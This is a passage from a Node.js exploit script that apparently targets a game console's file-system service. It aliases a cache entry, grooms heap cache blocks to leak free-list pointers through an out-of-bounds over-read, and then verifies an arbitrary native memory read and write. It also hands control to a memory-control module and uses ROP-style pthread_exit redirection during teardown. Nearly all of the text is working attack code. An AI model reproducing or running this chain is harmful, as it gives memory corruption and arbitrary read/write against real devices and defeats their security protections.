            check(steps.length === 7, 'Combined prefix needs exactly seven copies');
            cache.combinedPrefix = prefix.toString('hex');
            for (const step of steps) await copyField(step.bytes, name + '-' + step.end, copies);
          }
          const restoreAlias = async () => {
            {
              // The modified entry is still clean. Invalidation also handles
              // an ordinary-content miss that inserted a new entry.
              const reset = await s.ipc('Reset the clean alias cache', candidateHandle, 5,
                Buffer.concat([u64(2), u64(0), u64(storageSize)]));
              (cache.invalidateResults ||= []).push(reset.canonicalResult);
              await save();
              check(!reset.result, 'Clean alias cache invalidation failed');
            }
            const restored = await readStorage(candidateHandle, 16);
            cache.restoredPrefix = !restored.result && restored.bytes.equals(prime.bytes);
            (cache.restoreChecks ||= []).push({result: restored.result,
              observedHex: restored.bytes?.toString('hex'), matches: cache.restoredPrefix});
            await save();
            check(cache.restoredPrefix, 'Candidate prefix changed after restoration');
            cacheNeedsRestore = false;
            cache.restored = true;
            await save();
          };
          restoreCandidate = restoreAlias;
          // One accepted copy is enough to see whether the lookup for a bucket
          // selects the entry we modify. A dead bucket keeps returning the
          // ordinary content, so it is rejected after two waves instead of a
          // complete seven-step install.
          let chosenBucket = null;
          for (let bucket = 0; bucket < bucketLimit && chosenBucket === null; bucket++) {
            aliasOffset = leakOffset = buckets[bucket];
            cache.aliasOffset = aliasOffset;
            // Every bucket gets its own install budget; the family cap is
            // about one install running away, not about how many buckets fit.
            waveFamilyCounts.delete('alias');
            const aliasControl = await readStorage(storage, 16, aliasOffset);
            check(!aliasControl.result && !aliasControl.bytes.equals(control.bytes.subarray(0, 16)),
              'Alias control does not distinguish the two offsets');
            cache.aliasControlHex = aliasControl.bytes.toString('hex');
            cache.expectedAliasHex = control.bytes.subarray(0, 16).toString('hex');
            cacheNeedsRestore = true;
            await save();
            cache.attempts ||= [];
            // One install per bucket, one copy per field. A bucket whose seven
            // copies do not fit the wave budget is not this boot's bucket, so
            // rotate instead of spending the boot on it. Keep the combined-leak
            // prefix: the wave family cap and the progress labels match on it.
            try {
              await installCombinedLeak('combined-leak-' + bucket + '-0', 1);
            } catch (error) {
              cache.buckets.push({bucket, offset: '0x' + aliasOffset.toString(16),
                installError: error.message});
              await save();
              await restoreAlias();
              continue;
            }
            // Read the full cache-entry alias block, not just the first 16
            // bytes. The entry's own MemoryAddress/MemorySize fields are in
            // here; a canonical pointer in the block is a deterministic target
            // and does not depend on a free-list header changing.
            const aliased = await readStorage(candidateHandle, 0x40, aliasOffset);
            cache.readResult = aliased.result;
            cache.selectedAlias = cache.normalContent = false;
            cache.outputFile = cache.outputSha256 = cache.observedHex = cache.aliasBlockHex = null;
            if (aliased.bytes) {
              const prefix = aliased.bytes.subarray(0, 16);
              cache.outputFile = path.join(OUT, label + '-alias-output-' + bucket + '.bin');
              await fs.writeFile(cache.outputFile, aliased.bytes, {mode: 0o600});
              cache.outputSha256 = hash(aliased.bytes);
              cache.observedHex = prefix.toString('hex');
              cache.aliasBlockHex = aliased.bytes.toString('hex');
              cache.selectedAlias = prefix.equals(prime.bytes);
              cache.normalContent = prefix.equals(aliasControl.bytes);
            }
            const attempt = {bucket, offset: '0x' + aliasOffset.toString(16), result: aliased.result,
              observedHex: aliased.bytes?.subarray(0, 16).toString('hex'),
              aliasBlockHex: cache.aliasBlockHex,
              selectedAlias: cache.selectedAlias, normalContent: cache.normalContent,
              outputFile: aliased.bytes ? cache.outputFile : null};
            cache.attempts.push(attempt);
            cache.buckets.push(attempt);
            await save();
            if (cache.selectedAlias) chosenBucket = bucket;
            else await restoreCandidate();
            await save();
          }
          cache.chosenBucket = chosenBucket;
          cache.aliasOffset = aliasOffset;
          await save();
          check(chosenBucket !== null, 'Combined acquisition did not obtain the clean alias');
          check((cache.selectedAlias), 'Combined acquisition did not obtain the clean alias');
          if ((cache.selectedAlias)) {
            const range = report.cacheRange = {targetOffset: markerOffset, referenceRange: 0x4000,
              trialRange, readSize: cacheReadSize, readOffset: leakOffset,
              logicalRange: ('0x4141414141414141'),
              clean: true, outputPoison: cache.outputPoison};
            // Keep this entry clean: its original allocation size is not yet
            // read from native memory, so no content Flush is appropriate.
            restoreCandidate = async () => {
              {
                const invalidated = await s.ipc('Invalidate the widened clean cache', candidateHandle, 5,
                  Buffer.concat([u64(2), u64(0), u64(storageSize)]));
                range.invalidateResult = invalidated.canonicalResult;
                check(!invalidated.result, 'Widened cache invalidation failed');
                const restored = await readStorage(candidateHandle, controlSize);
                range.restoredContent = !restored.result && restored.bytes.equals(control.bytes);
                check(range.restoredContent, 'Content differs after widened cache invalidation');
                range.invalidated = true;
              }
              cacheNeedsRestore = false;
              await save();
            };
            cacheNeedsRestore = true;
            await save();
            {
              range.attempts = [];
              for (let attempt = 0; ; attempt++) {
                if (attempt && attempt % metadataAttempts === 0) {
                  throw Error('Clean range did not qualify within its attempt limit');
                }
                cacheNeedsRestore = true;
                await save();
                {
                  if (attempt) await installCombinedLeak('combined-expand-retry-' + attempt);
                }
                const beforeRelease = await readStorage(candidateHandle, cacheReadSize, leakOffset);
                range.beforeReleaseResult = beforeRelease.result;
                range.beforeReleasePrefixMatches = false;
                range.beforeReleaseFirstDifference = null;
                range.beforeReleaseFile = range.beforeReleaseSha256 = null;
                if (beforeRelease.bytes) {
                  range.beforeReleasePrefixMatches = beforeRelease.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000));
                  range.beforeReleaseFirstDifference = beforeRelease.bytes.findIndex((byte, i) => byte !== control.bytes[i]);
                  range.beforeReleaseFile = path.join(OUT, label + '-before-release-' + attempt + '.bin');
                  await fs.writeFile(range.beforeReleaseFile, beforeRelease.bytes, {mode: 0o600});
                  range.beforeReleaseSha256 = hash(beforeRelease.bytes);
                }
                range.attempts.push({attempt, result: beforeRelease.result,
                  prefixMatches: range.beforeReleasePrefixMatches, firstDifference: range.beforeReleaseFirstDifference,
                  outputFile: beforeRelease.bytes ? range.beforeReleaseFile : null,
                  sha256: beforeRelease.bytes ? range.beforeReleaseSha256 : null});
                await save();
                // Adjacent cached blocks can match ordinary content too.
                // Require a matching first block and a later real difference;
                // do not require that difference at exactly byte 0x4000.
                if (!beforeRelease.result && range.beforeReleasePrefixMatches && range.beforeReleaseFirstDifference >= 0x4000) break;
                check(!beforeRelease.result && range.beforeReleaseFirstDifference === -1,
                  'Neighbor-release control is not a qualified over-read');
                await restoreAlias();
              }
              const releasedCaches = range.releasedCaches = {results: []};
              // OperateRange(Invalidate) is explicitly unsupported on save-data
              // files (FS result 6398, UnsupportedOperateRangeForSaveDataFile),
              // so the commit cache cannot be groomed through its file handle.
              // The effective lever is the deeper content-cache priming below.
              releasedCaches.before = await memory();
              // These owners are all read-only content storages. Their cache
              // buffers can be freed without closing any app-owned object.
              for (const handle of new Set([storage, pinHandle, ...storages, originalRom].filter(Boolean))) {
                check(handle !== candidateHandle, 'Cannot invalidate the active leak owner');
                const reply = await s.ipc('Release neighboring clean content cache', handle, 5,
                  Buffer.concat([u64(2), u64(0), u64(storageSize)]));
                releasedCaches.results.push({handle, result: reply.canonicalResult});
                await save();
                check(!reply.result, 'Neighboring clean cache invalidation failed');
              }
              releasedCaches.after = await memory();
              releasedCaches.delta = releasedCaches.after.map((value, i) => value - releasedCaches.before[i]);
              await save();
              check(releasedCaches.delta[5] === 0, 'Neighbor invalidation changed general-heap geometry');
            }
            const widened = await readStorage(candidateHandle, cacheReadSize, leakOffset);
            range.readResult = widened.result;
            if (widened.bytes) {
              range.outputFile = path.join(OUT, label + '-range-output.bin');
              await fs.writeFile(range.outputFile, widened.bytes, {mode: 0o600});
              range.outputSha256 = hash(widened.bytes);
              range.firstDifference = widened.bytes.findIndex((byte, i) => byte !== control.bytes[i]);
              range.prefixMatches = widened.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000));
            }
            await save();
            if ((widened.bytes) && range.prefixMatches && range.firstDifference >= 0x4000) {
              range.earlyLinkCandidates = await nativeLinks(range);
              range.fragmentationSkipped = range.earlyLinkCandidates.some(item =>
                item.encodable && (item.changedLink || item.zeroTail || item.zeroAfter32));
              await save();
            }
            if (!range.fragmentationSkipped && (16) &&
                widened.bytes && range.prefixMatches && range.firstDifference >= 0x4000) {
              range.fragmentation = [];
              async function snapshot(name, invalidation = null) {
                const read = await readStorage(candidateHandle, cacheReadSize, leakOffset);
                check(!read.result, 'Fragmentation snapshot failed');
                const outputFile = path.join(OUT, label + '-' + name + '.bin');
                await fs.writeFile(outputFile, read.bytes, {mode: 0o600});
                const item = {name, outputFile, outputSha256: hash(read.bytes), invalidation,
                  firstDifference: read.bytes.findIndex((byte, i) => byte !== control.bytes[i]),
                  prefixMatches: read.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000)),
                  memory: await memory()};
                range.fragmentation.push(item);
                await save();
                check(item.prefixMatches,
                  'The widened candidate was replaced during fragmentation');
              }
              // Existing storage objects keep general-heap geometry fixed.
              // Prime every owned content storage over a distinct slice, then
              // invalidate them all. The measured gap is placement: 24 of the
              // 69 runs that reached this phase installed the alias but exposed
              // only stable links, i.e. no released free-list header inside the
              // 2 MiB over-read window. Each round allocates a fresh slice and
              // frees it, so each round is another independent chance that a
              // released block head lands in the window. A round is scored only
              // on its own two snapshots: comparing a round against the next
              // round's snapshots would report a content change as a changed
              // header, and the address stage must never start from that.
              const neighbors = [pinHandle, ...storages].filter(Boolean);
              const blocks = Math.max(1, Math.min(512,
                Math.floor(Number(process.env.NS2_GROOM_BLOCKS)) || fragmentCount * 8));
              const covered = Math.floor(control.bytes.length / 0x4000);
              // The far slice (from offset 0) is the proven one, so it runs
              // first and keeps the good boots as fast as before. Later rounds
              // repeat the allocate/free cycle at more file offsets, and each
              // round frees ~70 cache blocks: if a released block head lands in
              // the 128-block window at random, 3 rounds turn the measured 40%
              // per round into ~80%. A round that already exposes a usable link
              // stops the series, so good boots still pay one round.
              const groomRounds = Math.max(1, Math.min(4,
                Math.floor(Number(process.env.NS2_GROOM_ROUNDS)) || 3));
              const groomBases = process.env.NS2_GROOM_BASE === 'far' ? [0]
                : Array.from({length: groomRounds}, (_, i) => i * aliasOffset);
              report.grooming = {owners: neighbors.length, blocks, covered, primed: 0, rounds: []};
              for (const [round, base] of groomBases.entries()) {
                const roundReport = {round, base: '0x' + base.toString(16), primed: 0, skipped: 0};
                report.grooming.rounds.push(roundReport);
                for (const [ownerIndex, handle] of neighbors.entries()) {
                  const batched = [];
                  for (let i = 0; i < blocks; i++) {
                    const offset = base + (ownerIndex * blocks + i) * 0x4000;
                    // The candidate block itself: re-reading it can only
                    // disturb the alias.
                    if (offset === aliasOffset || offset + 0x4000 > Number(storageSize)) {
                      roundReport.skipped++;
                      continue;
                    }
                    // Only the first 2 MiB is byte-compared against the
                    // control read; everywhere else the reply status is the
                    // whole check, so those blocks go through the batched fill.
                    if (offset + 16 > control.bytes.length) {
                      batched.push(offset);
                      roundReport.primed++;
                      continue;
                    }
                    const read = await readStorage(handle, 16, offset, cache.outputPoison, false, true);
                    check(!read.result, 'Neighbor read failed');
                    check(read.bytes.equals(control.bytes.subarray(offset, offset + 16)),
                      'Neighbor content differs');
                    roundReport.primed++;
                  }
                  if (batched.length) {
                    const failed = await fillBlocks(handle, batched);
                    // check() evaluates its message eagerly, so the index is
                    // only formatted when there is a failure to report.
                    if (failed.length)
                      check(false, 'Neighbor read failed at 0x' + failed[0].toString(16));
                  }
                  const keep = await readStorage(candidateHandle, 16, leakOffset);
                  check(!keep.result && keep.bytes.equals(prime.bytes),
                    'Candidate prefix changed while priming neighbors');
                }
                report.grooming.primed += roundReport.primed;
                await save();
                await snapshot('fragment-primed-' + round);
                const freed = [];
                for (const [index, handle] of neighbors.entries()) {
                  const invalidated = await s.ipc('Invalidate clean neighboring cache ' + index, handle, 5,
                    Buffer.concat([u64(2), u64(0), u64(storageSize)]));
                  check(!invalidated.result, 'Neighbor cache invalidation failed');
                  freed.push(handle);
                }
                await snapshot('fragment-free-' + round, {handles: freed, operation: 2, result: 0});
                const pair = range.fragmentation.slice(-2);
                roundReport.freedBlocks = (pair[1].memory[3] - pair[0].memory[3]) / 0x4000;
                report.grooming.freedBlocks = (report.grooming.freedBlocks || 0) + roundReport.freedBlocks;
                groomRound = {report: roundReport, snapshots: pair};
                const seen = await nativeLinks({...range, fragmentation: pair});
                roundReport.candidates = seen.length;
                roundReport.usable = seen.filter(item => item.encodable &&
                  (item.changedLink || item.changedHeader || item.zeroTail)).length;
                await save();
                if (roundReport.usable) break;
              }
            }
            await restoreCandidate();
            range.completed = true;
          }
          if ((cache.selectedAlias)) {
            const range = report.cacheRange;
            check(range?.completed && range.readResult === 0 && range.prefixMatches && range.firstDifference >= 0x4000,
              'Combined acquisition needs a qualified native over-read');
            // Score only the round that produced this window; a cross-round
            // comparison would report the groom's own content change as a
            // changed free-list header, and the address stage would then write
            // to an address that was never a released block.
            const candidates = await nativeLinks(groomRound ?
              {...range, fragmentation: groomRound.snapshots} : range);
            report.linkCandidates = candidates;
            report.linkRound = groomRound?.report || null;
            await save();
            const strong = candidates.filter(item => item.encodable && (item.changedLink || item.changedHeader));
            const weak = candidates.filter(item => item.encodable && !item.changedHeader &&
              (item.zeroTail || (item.zeroAfter32 && !item.reusedBlockHead)));
            const stable = candidates.filter(item => item.encodable && item.stableLink);
            const weakAttempt = process.env.NS2_WEAK_ATTEMPT !== '0';
            // A stable pointer-like word is a real heap pointer, just not proof
            // that it is the released cache block. The address stage's first
            // read/write is bounded, so one stable attempt fails with its worker
            // owned instead of wedging the RPC loop. Set NS2_STABLE_ATTEMPT=0 to
            // keep the old clean-fail behaviour.
            const stableAttempt = process.env.NS2_STABLE_ATTEMPT !== '0';
            const selected = strong[0] || (weakAttempt ? weak[0] : undefined) ||
              (stableAttempt ? stable[0] : undefined);
            const belowFloor = candidates.filter(item => item.belowTargetFloor).length;
            report.linkSelection = {strong: strong.length, weak: weak.length, stable: stable.length,
              weakAttempt, stableAttempt, belowTargetFloor: belowFloor, minTarget,
              weakSelected: !strong.length && !!selected && !selected.stableLink,
              stableSelected: !strong.length && !!selected && !!selected.stableLink,
              selected: selected ? {offset: selected.offset, target: '0x' + selected.target.toString(16),
                changedLink: !!selected.changedLink, changedHeader: selected.changedHeader || 0,
                zeroTail: !!selected.zeroTail, zeroAfter32: !!selected.zeroAfter32,
                reusedBlockHead: !!selected.reusedBlockHead, stableLink: !!selected.stableLink} : null};
            await save();
            check(selected, 'No changedLink/changedHeader/zeroTail candidate on this boot (' +
              stable.length + ' stableLink' + (stableAttempt ? '' : '; NS2_STABLE_ATTEMPT=0') +
              (belowFloor ? '; ' + belowFloor + ' below 0x' + minTarget.toString(16) : '') +
              '); relaunch and retry');
            report.progress = {percent: Math.max(report.progress?.percent || 0, 86),
              label: 'address plan selected', profile: report.active?.profile, at: new Date().toISOString()};
            await save();
            const evidence = {session: live.session, target: '0x' + selected.target.toString(16),
              sourceFile: selected.sourceFile, sourceOffset: selected.offset, sourceSha256: selected.sourceSha256,
              sourceReport: file,
              qualification: selected.changedLink ?
                'Native clean-cache over-read; controlled cache allocation/release changed only the first word of this aligned block into an address candidate. Absolute address not yet verified.' :
                selected.changedHeader ? 'Native clean-cache over-read; controlled cache release changed the first ' +
                  selected.changedHeader + ' bytes (free-list header) of this aligned block and left the tail intact. Absolute address not yet verified.' :
                selected.zeroTail ? 'Native clean-cache over-read; aligned candidate followed by 56 zero bytes. Absolute address not yet verified.' :
                selected.zeroAfter32 ? 'Native clean-cache over-read; aligned candidate followed by up to 24 stale bytes and 16352 zero bytes. Absolute address not yet verified.' :
                selected.stableLink ? 'Native clean-cache over-read; stable pointer-like word at an interior cache offset. Absolute address not yet verified.' :
                'Native pre-release block-head candidate; the entire block changed after release. This is weaker evidence than a link-only change and the address still requires native verification.'};
            const evidenceFile = path.join(OUT, label + '-native-link-candidate.json');
            await fs.writeFile(evidenceFile, JSON.stringify(evidence, null, 2) + '\n', {mode: 0o600});
            await prepareAddressControl(evidence, evidenceFile);

            // A short input exercises native UTF-8 validation without an
            // overflow. Requalify the owned cache after these ordinary calls.
            const prefix = Buffer.from('/..\\');
            const invalid = await raw(saved, 7, Buffer.concat([prefix, Buffer.from([0xff, 0])]));
            const encodedBytes = Buffer.concat([prefix, addressPlan.writes[0].bytes, Buffer.from([0])]);
            const encoded = await raw(saved, 7, encodedBytes);
            const inputMatches = (await s.readOwned(b + 0x4000, encodedBytes.length)).equals(encodedBytes);
            report.cacheAddress.encodingControl = {kind: 'bounded-native-normalizer',
              invalidResult: invalid.canonicalResult, acceptedResult: encoded.canonicalResult, inputMatches,
              accepted: invalid.canonicalResult === 0x2eea02 && encoded.canonicalResult === 0x2eec02 && inputMatches};
            await save();
            check(report.cacheAddress.encodingControl.accepted, 'Native pointer encoding control failed');

            const reprime = await readStorage(candidateHandle, 16);
            check(!reprime.result && reprime.bytes.equals(prime.bytes), 'Candidate prefix differs before requalification');
            restoreCandidate = restoreAlias;
            cacheNeedsRestore = true;
            await save();
            await setAliasOffset('address-alias-offset');
            const selectedAgain = await readStorage(candidateHandle, 16, aliasOffset);
            report.cacheAddress.aliasRequalification = {result: selectedAgain.result,
              observedHex: selectedAgain.bytes?.toString('hex'),
              selected: !selectedAgain.result && selectedAgain.bytes.equals(prime.bytes)};
            await save();
            await restoreCandidate();
            check(report.cacheAddress.aliasRequalification.selected, 'The owned cache alias did not survive address preparation');
          }
          if ((cache.selectedAlias) && report.cacheAddress.periodControlHex !== prime.bytes.toString('hex')) {
            cacheNeedsRestore = true;
            await save();
            await copyField(Buffer.from([0xc2, 0x80, 0x02]), 'period-offset-3');
            await copyField(Buffer.alloc(0), 'period-offset-0');
            const period = await readStorage(candidateHandle, 16, 0x28000);
            report.cacheAddress.periodAlias = {result: period.result, actualHex: period.bytes?.toString('hex'),
              selectedAlias: !period.result && period.bytes.equals(prime.bytes)};
            if (report.cacheAddress.periodAlias.selectedAlias) report.cacheAddress.bucketPeriod = 0x28000;
            await restoreCandidate();
          }
          if (addressPlan && cache.selectedAlias) {
            check(addressPlan.cycle === 0x500000 || report.cacheAddress.bucketPeriod === addressPlan.cycle,
              'The planned bucket period did not qualify on this candidate');
            const address = report.cacheAddress, length = 0x4000, writeOffset = 0x108;
            check(addressPlan.target % 0x4000 === 0 && addressPlan.readOffset + length <= Number(storageSize),
              'The native address control needs a complete aligned buffer block');
            const ordinary = {bytes: await fs.readFile(address.controlFile)};
            let original, memoryNeedsRestore = false, memoryContext;
            async function writeWindow(bytes) {
              const input = b + 0xb0000;
              await put(input, bytes);
              const reply = await s.ipc('Write the selected memory window', candidateHandle, 1,
                Buffer.concat([u64(addressPlan.readOffset + writeOffset), u64(bytes.length)]),
                {send: [{address: input, size: bytes.length, mode: 1}], bounded: true});
              return reply.canonicalResult;
            }
            async function restoreMemory() {
              if (!memoryNeedsRestore) return;
              address.restoreWriteResult = await writeWindow(original.subarray(writeOffset, writeOffset + 16));
              check(!address.restoreWriteResult, 'Selected memory restoration write failed');
              const restored = await readStorage(candidateHandle, length, addressPlan.readOffset,
                cache.outputPoison, true);
              address.restoreReadResult = restored.result;
              if (restored.bytes) {
                address.restoreOutputFile = path.join(OUT, label + '-address-restored.bin');
                await fs.writeFile(address.restoreOutputFile, restored.bytes, {mode: 0o600});
                address.restoreSha256 = hash(restored.bytes);
              }
              address.memoryRestored = !restored.result && restored.bytes.equals(original);
              await save();
              check(address.memoryRestored, 'Selected memory differs after restoration');
              memoryNeedsRestore = false;
              await save();
            }
            // Never flush or invalidate a redirected dirty entry. Clearing
            // its valid byte makes finalization skip the synthetic pointer.
            restoreCandidate = async () => {
              if (report.retainedMemory?.promoted) {
                check(memoryContext, 'Retained memory context is unavailable');
                await require("../retained/retained-memory.cjs").retire(memoryContext);
                address.retired = true;
                cacheNeedsRestore = false;
                await save();
                return;
              }
              await restoreMemory();
              await copyField(Buffer.alloc(0x10, 'B'), 'retire-address-entry');
              address.retired = true;
              cacheNeedsRestore = false;
              await save();
            };
            cacheNeedsRestore = true;
            await save();
            for (const step of addressPlan.writes) await copyField(step.bytes, 'address-header-' + step.end);
            const first = await readStorage(candidateHandle, length, addressPlan.readOffset, 0xa5, true);
            const second = await readStorage(candidateHandle, length, addressPlan.readOffset, 0x5a, true);
            address.readResults = [first.result, second.result];
            if (second.bytes) {
              address.repeatOutputFile = path.join(OUT, label + '-address-output-repeat.bin');
              await fs.writeFile(address.repeatOutputFile, second.bytes, {mode: 0o600});
              address.repeatSha256 = hash(second.bytes);
            }
            if (first.bytes) {
              address.outputFile = path.join(OUT, label + '-address-output.bin');
              await fs.writeFile(address.outputFile, first.bytes, {mode: 0o600});
              address.outputSha256 = hash(first.bytes);
              address.repeatMatches = second.bytes?.equals(first.bytes) || false;
              address.differsFromContent = !first.bytes.equals(ordinary.bytes);
              address.first64Hex = first.bytes.subarray(0, 64).toString('hex');
            }
            address.readVerified = !first.result && !second.result && address.repeatMatches && address.differsFromContent;
            await save();
            check(address.readVerified, 'The native address read did not pass both poison and content controls');
            report.progress = {percent: Math.max(report.progress?.percent || 0, 94),
              label: 'address read verified', profile: report.active?.profile, at: new Date().toISOString()};
            await save();
            {
              original = first.bytes;
              const marker = Buffer.from('46532d52572d323600ff11223344aa55', 'hex');
              check(marker.length === 16, 'The write marker must cover exactly sixteen bytes');
              const expected = Buffer.from(original);
              marker.copy(expected, writeOffset);
              memoryNeedsRestore = true;
              address.writeAddress = addressPlan.target + writeOffset;
              address.writeMarker = marker.toString('hex');
              await save();
              address.writeResult = await writeWindow(marker);
              check(!address.writeResult, 'Selected memory write failed');
              const changed = await readStorage(candidateHandle, length, addressPlan.readOffset,
                cache.outputPoison, true);
              address.writeVerified = !changed.result && changed.bytes.equals(expected);
              if (changed.bytes) {
                address.writeOutputFile = path.join(OUT, label + '-address-write-output.bin');
                await fs.writeFile(address.writeOutputFile, changed.bytes, {mode: 0o600});
                address.writeOutputSha256 = hash(changed.bytes);
              }
              await save();
              check(address.writeVerified, 'Selected memory write or neighboring bytes differ');
              report.progress = {percent: Math.max(report.progress?.percent || 0, 98),
                label: 'address write verified', profile: report.active?.profile, at: new Date().toISOString()};
              await save();
              await restoreMemory();
              address.savedProof = await require('./verify-proof.cjs').verifyProof(file, live.session);
              await save();
            }
            {
              const controller = require("./fs-memory-control.cjs");
              await fs.copyFile(path.join(__dirname, 'fs-memory-control.cjs'),
                path.join(OUT, label + '-memory-control-source.cjs'));
              memoryContext = {s, live, report, file, label, save, storageSize: Number(storageSize),
                initialPlan: addressPlan, copyField, readStorage, candidateHandle, input: b + 0xb0000, put,
                runControl};
              await controller.serve(memoryContext);
            }
            await restoreCandidate();
            address.completed = true;
          }
          await s.close(candidateHandle);
          candidateHandle = null;
          const fresh = domain.oneHandle(await s.ipc('Verify content with a fresh storage', root, 200));
          const verified = await readStorage(fresh, controlSize);
          cache.backingUnchanged = !verified.result && verified.bytes.equals(control.bytes);
          const verifiedAlias = await readStorage(fresh, 16, aliasOffset);
          // cache.aliasControlHex holds the chosen bucket's ordinary content.
          cache.backingUnchanged &&= !verifiedAlias.result &&
            verifiedAlias.bytes.toString('hex') === cache.aliasControlHex;
          if (addressPlan && report.cacheAddress.completed) {
            const original = await fs.readFile(report.cacheAddress.controlFile);
            const verifiedAddress = await readStorage(fresh, original.length, addressPlan.readOffset,
              cache.outputPoison, true);
            report.cacheAddress.backingUnchanged = !verifiedAddress.result && verifiedAddress.bytes.equals(original);
            cache.backingUnchanged &&= report.cacheAddress.backingUnchanged;
          }
          check(cache.backingUnchanged, 'Fresh content differs after cache restoration');
          await s.close(fresh);
          cache.completed = true;
        }
      } else report.skipped = 'Negative control did not retain all paths in the required order';
    }
    if (report.firstPositiveGuardPending) report.placementUncertain = true;
    report.localRelease.completed = true;
    report.completed = true;
  } catch (error) {
    if (localReleaseMayHaveRun) report.placementUncertain = true;
    if (error instanceof StopRequested) report.stopped = true;
    else {
      report.error = error.stack;
      process.exitCode = 1;
      if (runControl.started && await s.ready()) {
        if (s.threads.size && workers.length) {
          try {
            const capture = await require("./capture-workers.cjs").captureWorkers(s, workers);
            report.workerCaptureFile = path.join(OUT, label + '-worker-failure.json');
            await fs.writeFile(report.workerCaptureFile, JSON.stringify(capture, null, 2) + '\n', {mode: 0o600});
          } catch (captureError) {report.workerCaptureError = captureError.stack;}
          await save();
        }
        console.log(JSON.stringify({stage: ('bounded-failure'), file, error: error.message}));
      }
    }
  }
  finally {
    runControl.retire();
    try {
      if (!released && s.threads.size && await s.ready()) {
        const parked = workers.filter(worker => !worker.joined && s.threads.has(worker.thread));
        // Replace the next call with pthread_exit, then release every gate.
        for (const worker of parked) await s.rpc.store64(worker.cancelCell, BigInt(live.sdk + rop.PTHREAD_EXIT));
        for (const gate of gates) await events.signal(s, gate);
        // Use the bounded console join. A worker that is blocked inside the
        // FS service never stores its cells, so a direct pthread_join here
        // would freeze the console's single RPC thread and take /eval with it.
        for (const worker of parked) await native.join(s, worker);
        report.setupCancelled = true;
      }
      if (!report.placementUncertain && !s.threads.size && cacheNeedsRestore && restoreCandidate && await s.ready()) {
        try {await restoreCandidate();}
        catch (error) {report.cacheRestoreError = error.stack; process.exitCode = 1;}
      }
      if (!report.placementUncertain && !s.threads.size && !cacheNeedsRestore && await s.ready()) {
        // Bisect switch. The console freezes when this block *completes* and not
        // when it is aborted (switch-tNBR5 aborted at its first close and stayed
        // alive; jJeti/TotQ2/QXAs7 completed it and froze immediately - QXAs7
        // with HEN unarmed). NS2_RETIRE_LEAK=1 keeps the cache restore above but
        // leaves the handles, the group, the scratch and the allocation in
        // place, so a boot can tell "closing our FS objects" from "the rest of
        // the teardown".
        // Skipping this teardown is now the default: closing the app performs
        // the same closes and frees safely, while doing them here froze the
        // console every time it completed (jJeti, TotQ2, QXAs7). The cache
        // entry is restored above, which is what FS cannot survive.
        // NS2_RETIRE_CLEANUP=1 opts back in.
        report.cleanupSkipped = process.env.NS2_RETIRE_CLEANUP !== '1';
        if (!report.cleanupSkipped) {
          if (fileHandle && s.handles.has(fileHandle)) await s.close(fileHandle);
          await closeGroup();
          for (const item of [...created].reverse()) {
            check(!(await normal(item.handle, 4, item.path)).result, 'Gap scratch removal failed');
            check(!(await s.ipc('Commit gap scratch removal', item.handle, 10)).result, 'Gap cleanup commit failed');
            check((await normal(item.handle, 7, item.path)).canonicalResult === 0x202, 'Gap scratch remains');
            created.splice(created.indexOf(item), 1);
          }
          for (const gate of gates) await events.finalize(s, gate);
          await s.cleanup();
        }
      }
    } catch (error) {report.cleanupError = error.stack; process.exitCode = 1;}
    await s.closeUpload();
    report.cleanedUp = !s.base && !s.handles.size && !s.threads.size && !created.length && !group;
    report.finished = new Date().toISOString();
    await runControl.close();
    // The event log is buffered (250 ms), so flush it before the report and
    // the process end.
    if (typeof s.flushRecord === 'function') { try { await s.flushRecord(); } catch {} }
    await save();
    console.log(JSON.stringify({file, completed: report.completed, cleanedUp: report.cleanedUp,
      qualifiedReadSize: report.qualifiedReadSize, error: report.error, cleanupError: report.cleanupError}));
  }
}

main().catch(error => {console.error(error.stack); process.exitCode = 1;});
